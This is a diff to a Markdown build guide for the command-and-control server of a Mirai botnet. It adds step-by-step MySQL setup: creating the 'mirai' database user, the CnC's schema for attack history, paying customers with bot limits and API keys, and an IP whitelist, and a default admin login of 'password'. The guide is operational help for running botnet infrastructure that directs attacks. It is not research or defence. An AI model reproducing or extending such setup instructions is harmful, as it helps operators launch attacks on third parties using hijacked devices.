@@ -1,10 +1,15 @@
-# Building the CnC (Command and Control) Server
+# The CnC (Command and Control) Server
 
-This document provides a step-by-step guide to building the CnC (Command and Control) server for the Mirai Botnet project. It includes instructions for installing Go, .
+The CnC (Command and Control) server is a crucial component of the Mirai Botnet project, responsible for managing and controlling the botnet.
+
+All the bots in the network connect to the CnC server to receive commands like `attack`.
+
+This document provides a step-by-step guide to building the CnC server, including instructions for installing Go, building the CnC, and handling common errors.
 
 ## Quick Links
 
--   [Install Go](#installing-go)
+-   [Install Go](#installing-go-manual-method-recommended)
+-   [Install MySQL](#installing-mysql)
 -   [Building the CnC](#building-the-cnc)
 -   [Additional Notes](#additional-notes)
 -   [Disclaimer](#disclaimer)
@@ -78,6 +83,120 @@ go version go1.25.0 linux/amd64
 
 -   [Go Downloads](https://go.dev/dl/)
 -   [Official Install Docs](https://go.dev/doc/install)
+
+</details>
+
+---
+
+## Installing MySQL
+
+> This section explains how to install MySQL, which is required for the CnC server to store bot and user data.
+
+<details>
+<summary>Click to See MySQL Installation and Setup Steps</summary>
+
+### 1. Install MySQL Server
+
+```bash
+sudo apt-get update
+sudo apt-get install mysql-server
+```
+
+### 2. Make a MySQL User
+
+```bash
+sudo mysql -u root -p
+```
+
+Inside the MySQL shell, run:
+
+```sql
+CREATE USER 'mirai'@'localhost' IDENTIFIED BY 'password';
+```
+
+### 3. Grant Permissions to the User
+
+```sql
+GRANT ALL PRIVILEGES ON mirai.* TO 'mirai'@'localhost';
+FLUSH PRIVILEGES;
+```
+
+### 4. Create the Database
+
+Inside the MySQL shell, run:
+
+```sql
+CREATE DATABASE mirai;
+
+CREATE TABLE `history` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(10) unsigned NOT NULL,
+  `time_sent` int(10) unsigned NOT NULL,
+  `duration` int(10) unsigned NOT NULL,
+  `command` text NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  PRIMARY KEY (`id`),
+  KEY `user_id` (`user_id`)
+);
+
+CREATE TABLE `users` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `username` varchar(32) NOT NULL,
+  `password` varchar(32) NOT NULL,
+  `duration_limit` int(10) unsigned DEFAULT NULL,
+  `cooldown` int(10) unsigned NOT NULL,
+  `wrc` int(10) unsigned DEFAULT NULL,
+  `last_paid` int(10) unsigned NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  `admin` int(10) unsigned DEFAULT '0',
+  `intvl` int(10) unsigned DEFAULT '30',
+  `api_key` text,
+  PRIMARY KEY (`id`),
+  KEY `username` (`username`)
+);
+
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+```
+
+### 5. Create a user in the user table
+
+Inside the MySQL shell, run:
+
+```sql
+INSERT INTO users (username, password, duration_limit, cooldown, wrc, last_paid, max_bots, admin, intvl, api_key)
+VALUES ('mirai', 'password', NULL, 0, NULL, UNIX_TIMESTAMP(), -1, 1, 30, 'your_api_key_here');
+```
+
+This is the default user that will be used to connect to the CnC server. You can change the username and password as needed.
+
+When connecting to the CnC, when asked for the username and password, use the ones you set in the users table.
+
+Default values are:
+
+-   Username: `mirai`
+-   Password: `password`
+
+### 6. Exit MySQL Shell
+
+```sql
+EXIT;
+```
+
+### 7. Verify MySQL Installation
+
+You can verify that MySQL is running by checking its status:
+
+```bash
+sudo systemctl status mysql
+```
+
+If MySQL is running, you should see an output indicating that the service is active (running).
 
 </details>
 
